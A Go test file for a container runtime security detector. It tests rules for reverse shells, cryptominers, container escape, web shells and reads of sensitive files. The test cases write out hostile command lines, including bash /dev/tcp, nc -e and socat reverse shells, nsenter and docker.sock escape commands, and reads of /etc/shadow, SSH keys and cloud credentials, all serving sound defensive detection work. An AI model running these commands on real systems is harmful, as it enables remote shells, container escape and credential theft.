package security

import (
	"os"
	"path/filepath"
	"testing"
	"time"
)

func TestRulesEngineBuiltinRules(t *testing.T) {
	engine := NewRulesEngine()
	rules := engine.GetRules()

	if len(rules) == 0 {
		t.Error("Expected built-in rules to be loaded")
	}

	// Check specific rules exist
	ruleIDs := map[string]bool{
		"shell_in_container":      false,
		"cryptominer_process":     false,
		"reverse_shell":           false,
		"privileged_container":    false,
		"sensitive_file_access":   false,
		"suspicious_outbound":     false,
		"container_escape":        false,
		"web_shell_execution":     false,
	}

	for _, rule := range rules {
		if _, exists := ruleIDs[rule.ID]; exists {
			ruleIDs[rule.ID] = true
		}
	}

	for id, found := range ruleIDs {
		if !found {
			t.Errorf("Expected built-in rule %s not found", id)
		}
	}
}

func TestShellInContainerRule(t *testing.T) {
	engine := NewRulesEngine()

	// Test shell in container should match
	event := &SecurityEvent{
		Type:        EventTypeProcess,
		Comm:        "bash",
		ContainerID: "abc123",
	}

	matches := engine.Match(event)
	found := false
	for _, rule := range matches {
		if rule.ID == "shell_in_container" {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected shell_in_container rule to match")
	}

	// Test shell without container should not match
	event2 := &SecurityEvent{
		Type: EventTypeProcess,
		Comm: "bash",
	}

	matches2 := engine.Match(event2)
	for _, rule := range matches2 {
		if rule.ID == "shell_in_container" {
			t.Error("shell_in_container should not match without container")
		}
	}
}

func TestCryptominerRule(t *testing.T) {
	engine := NewRulesEngine()

	testCases := []struct {
		name    string
		comm    string
		cmdline string
		expect  bool
	}{
		{"xmrig process", "xmrig", "", true},
		{"minerd process", "minerd", "", true},
		{"stratum in cmdline", "miner", "stratum+tcp://pool.example.com", true},
		{"normal process", "nginx", "", false},
		{"ethminer", "ethminer", "", true},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			event := &SecurityEvent{
				Type:    EventTypeProcess,
				Comm:    tc.comm,
				Cmdline: tc.cmdline,
			}

			matches := engine.Match(event)
			found := false
			for _, rule := range matches {
				if rule.ID == "cryptominer_process" {
					found = true
					break
				}
			}
			if found != tc.expect {
				t.Errorf("Expected match=%v for %s, got %v", tc.expect, tc.name, found)
			}
		})
	}
}

func TestReverseShellRule(t *testing.T) {
	engine := NewRulesEngine()

	testCases := []struct {
		name    string
		cmdline string
		expect  bool
	}{
		{"bash reverse shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", true},
		{"nc reverse shell", "nc -e /bin/sh 10.0.0.1 4444", true},
		{"python reverse shell", "python -c 'import socket,subprocess'", true},
		{"normal bash", "bash script.sh", false},
		{"socat shell", "socat tcp:10.0.0.1:4444 exec:/bin/sh", true},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			event := &SecurityEvent{
				Type:    EventTypeProcess,
				Comm:    "bash",
				Cmdline: tc.cmdline,
			}

			matches := engine.Match(event)
			found := false
			for _, rule := range matches {
				if rule.ID == "reverse_shell" {
					found = true
					break
				}
			}
			if found != tc.expect {
				t.Errorf("Expected match=%v for %s, got %v", tc.expect, tc.name, found)
			}
		})
	}
}

func TestSensitiveFileAccessRule(t *testing.T) {
	engine := NewRulesEngine()

	testCases := []struct {
		name   string
		path   string
		expect bool
	}{
		{"shadow file", "/etc/shadow", true},
		{"passwd file", "/etc/passwd", true},
		{"ssh private key", "/root/.ssh/id_rsa", true},
		{"aws credentials", "/home/user/.aws/credentials", true},
		{"normal file", "/var/log/messages", false},
		{"kubernetes secrets", "/var/run/secrets/kubernetes.io/serviceaccount/token", true},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			event := &SecurityEvent{
				Type:     EventTypeFile,
				FilePath: tc.path,
				Comm:     "cat",
			}

			matches := engine.Match(event)
			found := false
			for _, rule := range matches {
				if rule.ID == "sensitive_file_access" {
					found = true
					break
				}
			}
			if found != tc.expect {
				t.Errorf("Expected match=%v for %s, got %v", tc.expect, tc.name, found)
			}
		})
	}
}

func TestSuspiciousOutboundRule(t *testing.T) {
	engine := NewRulesEngine()

	testCases := []struct {
		name   string
		port   uint16
		expect bool
	}{
		{"metasploit port", 4444, true},
		{"mining pool 3333", 3333, true},
		{"tor socks", 9050, true},
		{"normal https", 443, false},
		{"normal http", 80, false},
		{"bitcoin port", 8333, true},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			event := &SecurityEvent{
				Type:    EventTypeNetwork,
				DstPort: tc.port,
				DstIP:   "1.2.3.4",
			}

			matches := engine.Match(event)
			found := false
			for _, rule := range matches {
				if rule.ID == "suspicious_outbound" {
					found = true
					break
				}
			}
			if found != tc.expect {
				t.Errorf("Expected match=%v for port %d, got %v", tc.expect, tc.port, found)
			}
		})
	}
}

func TestContainerEscapeRule(t *testing.T) {
	engine := NewRulesEngine()

	testCases := []struct {
		name    string
		cmdline string
		expect  bool
	}{
		{"nsenter attack", "nsenter --mount=/proc/1/ns/mnt", true},
		{"docker socket access", "curl --unix-socket /var/run/docker.sock", true},
		{"proc root access", "cat /proc/1/root/etc/passwd", true},
		{"capsh abuse", "capsh --print", true},
		{"normal command", "ls -la /tmp", false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			event := &SecurityEvent{
				Type:        EventTypeProcess,
				Comm:        "bash",
				Cmdline:     tc.cmdline,
				ContainerID: "container123",
			}

			matches := engine.Match(event)
			found := false
			for _, rule := range matches {
				if rule.ID == "container_escape" {
					found = true
					break
				}
			}
			if found != tc.expect {
				t.Errorf("Expected match=%v for %s, got %v", tc.expect, tc.name, found)
			}
		})
	}
}

func TestPrivilegedContainerRule(t *testing.T) {
	engine := NewRulesEngine()

	// Privileged container should match
	event := &SecurityEvent{
		Type:        EventTypeContainer,
		ContainerID: "abc123",
		Privileged:  true,
	}

	matches := engine.Match(event)
	found := false
	for _, rule := range matches {
		if rule.ID == "privileged_container" {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected privileged_container rule to match")
	}

	// Non-privileged should not match
	event2 := &SecurityEvent{
		Type:        EventTypeContainer,
		ContainerID: "abc123",
		Privileged:  false,
	}

	matches2 := engine.Match(event2)
	for _, rule := range matches2 {
		if rule.ID == "privileged_container" {
			t.Error("privileged_container should not match non-privileged container")
		}
	}
}

func TestDetector(t *testing.T) {
	tmpDir := t.TempDir()
	dbPath := filepath.Join(tmpDir, "security_test.db")

	store, err := NewStore(dbPath)
	if err != nil {
		t.Fatalf("Failed to create store: %v", err)
	}
	defer store.Close()

	var receivedAlerts []*SecurityAlert
	detector := NewDetector(DetectorConfig{
		Store:       store,
		DedupWindow: 1 * time.Second,
		AlertCallback: func(alert *SecurityAlert) {
			receivedAlerts = append(receivedAlerts, alert)
		},
	})

	// Test process exec that triggers cryptominer rule
	alerts := detector.ProcessProcessExec(
		1234, 1, 0, 0,
		"xmrig", "./xmrig --pool stratum+tcp://pool.example.com:3333", "/tmp/xmrig", "bash",
		"", "", "", "", "",
		false, "host1", "testhost",
	)

	if len(alerts) == 0 {
		t.Error("Expected alert for cryptominer process")
	}

	// Verify callback was called
	if len(receivedAlerts) == 0 {
		t.Error("Expected alert callback to be called")
	}

	// Verify alert was stored
	storedAlerts, err := store.ListOpenAlerts()
	if err != nil {
		t.Fatalf("Failed to list alerts: %v", err)
	}
	if len(storedAlerts) == 0 {
		t.Error("Expected alert to be stored")
	}

	// Verify deduplication
	alerts2 := detector.ProcessProcessExec(
		1234, 1, 0, 0,
		"xmrig", "./xmrig --pool stratum+tcp://pool.example.com:3333", "/tmp/xmrig", "bash",
		"", "", "", "", "",
		false, "host1", "testhost",
	)

	if len(alerts2) != 0 {
		t.Error("Expected duplicate alert to be suppressed")
	}

	// Wait for dedup window to expire
	time.Sleep(1100 * time.Millisecond)

	// Should generate new alert after window expires
	alerts3 := detector.ProcessProcessExec(
		1234, 1, 0, 0,
		"xmrig", "./xmrig --pool stratum+tcp://pool.example.com:3333", "/tmp/xmrig", "bash",
		"", "", "", "", "",
		false, "host1", "testhost",
	)

	if len(alerts3) == 0 {
		t.Error("Expected new alert after dedup window expired")
	}
}

func TestDetectorNetworkEvent(t *testing.T) {
	detector := NewDetector(DefaultDetectorConfig())

	// Test suspicious outbound connection
	alerts := detector.ProcessNetworkConnect(
		1234, "suspicious_app",
		"192.168.1.100", 54321,
		"10.0.0.1", 4444, "tcp",
		"", "",
		"host1", "testhost",
	)

	if len(alerts) == 0 {
		t.Error("Expected alert for suspicious port 4444")
	}

	found := false
	for _, alert := range alerts {
		if alert.RuleID == "suspicious_outbound" {
			found = true
			if alert.Severity != SeverityMedium {
				t.Errorf("Expected medium severity, got %s", alert.Severity)
			}
		}
	}
	if !found {
		t.Error("Expected suspicious_outbound rule to trigger")
	}
}

func TestDetectorFileEvent(t *testing.T) {
	detector := NewDetector(DefaultDetectorConfig())

	// Test sensitive file access
	alerts := detector.ProcessFileAccess(
		1234, "cat", "/etc/shadow", "read", 0644,
		"", "",
		"host1", "testhost",
	)

	if len(alerts) == 0 {
		t.Error("Expected alert for /etc/shadow access")
	}

	found := false
	for _, alert := range alerts {
		if alert.RuleID == "sensitive_file_access" {
			found = true
		}
	}
	if !found {
		t.Error("Expected sensitive_file_access rule to trigger")
	}
}

func TestStore(t *testing.T) {
	tmpDir := t.TempDir()
	dbPath := filepath.Join(tmpDir, "security_store_test.db")

	store, err := NewStore(dbPath)
	if err != nil {
		t.Fatalf("Failed to create store: %v", err)
	}
	defer store.Close()

	// Test event storage
	event := &SecurityEvent{
		ID:          "event1",
		Timestamp:   time.Now(),
		Type:        EventTypeProcess,
		HostID:      "host1",
		Hostname:    "testhost",
		PID:         1234,
		Comm:        "test",
		ContainerID: "container1",
	}

	if err := store.RecordEvent(event); err != nil {
		t.Fatalf("Failed to record event: %v", err)
	}

	// Retrieve event
	retrieved, err := store.GetEvent("event1")
	if err != nil {
		t.Fatalf("Failed to get event: %v", err)
	}
	if retrieved.Comm != "test" {
		t.Errorf("Expected comm 'test', got '%s'", retrieved.Comm)
	}

	// Test alert storage
	now := time.Now()
	alert := &SecurityAlert{
		ID:          "alert1",
		RuleID:      "test_rule",
		RuleName:    "Test Rule",
		Severity:    SeverityHigh,
		State:       AlertStateOpen,
		Title:       "Test Alert",
		Description: "Test description",
		EventID:     "event1",
		HostID:      "host1",
		Hostname:    "testhost",
		DetectedAt:  now,
	}

	if err := store.RecordAlert(alert); err != nil {
		t.Fatalf("Failed to record alert: %v", err)
	}

	// Retrieve alert
	retrievedAlert, err := store.GetAlert("alert1")
	if err != nil {
		t.Fatalf("Failed to get alert: %v", err)
	}
	if retrievedAlert.Title != "Test Alert" {
		t.Errorf("Expected title 'Test Alert', got '%s'", retrievedAlert.Title)
	}

	// Test acknowledge
	if err := store.AcknowledgeAlert("alert1", "testuser", "Investigating"); err != nil {
		t.Fatalf("Failed to acknowledge alert: %v", err)
	}

	retrievedAlert, _ = store.GetAlert("alert1")
	if retrievedAlert.State != AlertStateAcknowledged {
		t.Errorf("Expected state acknowledged, got %s", retrievedAlert.State)
	}
	if retrievedAlert.AcknowledgedBy != "testuser" {
		t.Errorf("Expected acknowledged_by 'testuser', got '%s'", retrievedAlert.AcknowledgedBy)
	}

	// Test resolve
	if err := store.ResolveAlert("alert1", "admin", "Fixed the issue"); err != nil {
		t.Fatalf("Failed to resolve alert: %v", err)
	}

	retrievedAlert, _ = store.GetAlert("alert1")
	if retrievedAlert.State != AlertStateResolved {
		t.Errorf("Expected state resolved, got %s", retrievedAlert.State)
	}

	// Test listing
	alerts, err := store.ListAlerts(AlertFilter{Severity: string(SeverityHigh)})
	if err != nil {
		t.Fatalf("Failed to list alerts: %v", err)
	}
	if len(alerts) != 1 {
		t.Errorf("Expected 1 alert, got %d", len(alerts))
	}
}

func TestStoreAlertSummary(t *testing.T) {
	tmpDir := t.TempDir()
	dbPath := filepath.Join(tmpDir, "summary_test.db")

	store, err := NewStore(dbPath)
	if err != nil {
		t.Fatalf("Failed to create store: %v", err)
	}
	defer store.Close()

	// Create some alerts
	now := time.Now()
	alerts := []SecurityAlert{
		{ID: "a1", RuleID: "r1", RuleName: "Rule 1", Severity: SeverityCritical, State: AlertStateOpen, HostID: "h1", Hostname: "host1", DetectedAt: now, Title: "Alert 1"},
		{ID: "a2", RuleID: "r1", RuleName: "Rule 1", Severity: SeverityCritical, State: AlertStateOpen, HostID: "h1", Hostname: "host1", DetectedAt: now, Title: "Alert 2"},
		{ID: "a3", RuleID: "r2", RuleName: "Rule 2", Severity: SeverityHigh, State: AlertStateResolved, HostID: "h2", Hostname: "host2", DetectedAt: now, Title: "Alert 3"},
		{ID: "a4", RuleID: "r3", RuleName: "Rule 3", Severity: SeverityMedium, State: AlertStateOpen, HostID: "h1", Hostname: "host1", ContainerID: "c1", ContainerName: "container1", DetectedAt: now, Title: "Alert 4"},
	}

	for _, alert := range alerts {
		if err := store.RecordAlert(&alert); err != nil {
			t.Fatalf("Failed to record alert: %v", err)
		}
	}

	summary, err := store.GetAlertSummary(24 * time.Hour)
	if err != nil {
		t.Fatalf("Failed to get summary: %v", err)
	}

	if summary.TotalAlerts != 4 {
		t.Errorf("Expected 4 total alerts, got %d", summary.TotalAlerts)
	}
	if summary.OpenAlerts != 3 {
		t.Errorf("Expected 3 open alerts, got %d", summary.OpenAlerts)
	}
	if summary.CriticalCount != 2 {
		t.Errorf("Expected 2 critical alerts, got %d", summary.CriticalCount)
	}
	// High alert is resolved, so HighCount should be 0 (only counts open alerts)
	if summary.HighCount != 0 {
		t.Errorf("Expected 0 high alerts (resolved don't count), got %d", summary.HighCount)
	}
}

func TestRuleEnableDisable(t *testing.T) {
	engine := NewRulesEngine()

	// Disable a rule
	engine.DisableRule("shell_in_container")

	rule := engine.GetRule("shell_in_container")
	if rule == nil {
		t.Fatal("Rule not found")
	}
	if rule.Enabled {
		t.Error("Expected rule to be disabled")
	}

	// Test that disabled rule doesn't match
	event := &SecurityEvent{
		Type:        EventTypeProcess,
		Comm:        "bash",
		ContainerID: "abc123",
	}

	matches := engine.Match(event)
	for _, r := range matches {
		if r.ID == "shell_in_container" {
			t.Error("Disabled rule should not match")
		}
	}

	// Re-enable
	engine.EnableRule("shell_in_container")
	matches = engine.Match(event)
	found := false
	for _, r := range matches {
		if r.ID == "shell_in_container" {
			found = true
		}
	}
	if !found {
		t.Error("Re-enabled rule should match")
	}
}

func TestWebShellExecutionRule(t *testing.T) {
	engine := NewRulesEngine()

	testCases := []struct {
		name       string
		parentComm string
		comm       string
		expect     bool
	}{
		{"nginx spawning bash", "nginx", "bash", true},
		{"apache spawning sh", "apache2", "sh", true},
		{"php-fpm spawning bash", "php-fpm", "bash", true},
		{"node spawning sh", "node", "sh", true},
		{"bash spawning bash", "bash", "bash", false},
		{"nginx spawning ls", "nginx", "ls", false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			event := &SecurityEvent{
				Type:       EventTypeProcess,
				Comm:       tc.comm,
				ParentComm: tc.parentComm,
			}

			matches := engine.Match(event)
			found := false
			for _, rule := range matches {
				if rule.ID == "web_shell_execution" {
					found = true
					break
				}
			}
			if found != tc.expect {
				t.Errorf("Expected match=%v for %s, got %v", tc.expect, tc.name, found)
			}
		})
	}
}

func TestDetectorStats(t *testing.T) {
	detector := NewDetector(DefaultDetectorConfig())

	// Process some events
	detector.ProcessEvent(&SecurityEvent{
		Type: EventTypeProcess,
		Comm: "normal",
	})

	detector.ProcessProcessExec(
		1234, 1, 0, 0,
		"xmrig", "./xmrig", "/tmp/xmrig", "bash",
		"", "", "", "", "",
		false, "host1", "testhost",
	)

	stats := detector.GetStats()

	if stats.EventsProcessed != 2 {
		t.Errorf("Expected 2 events processed, got %d", stats.EventsProcessed)
	}

	if stats.AlertsGenerated < 1 {
		t.Errorf("Expected at least 1 alert generated, got %d", stats.AlertsGenerated)
	}

	if stats.RulesLoaded == 0 {
		t.Error("Expected rules to be loaded")
	}
}

func TestMain(m *testing.M) {
	os.Exit(m.Run())
}
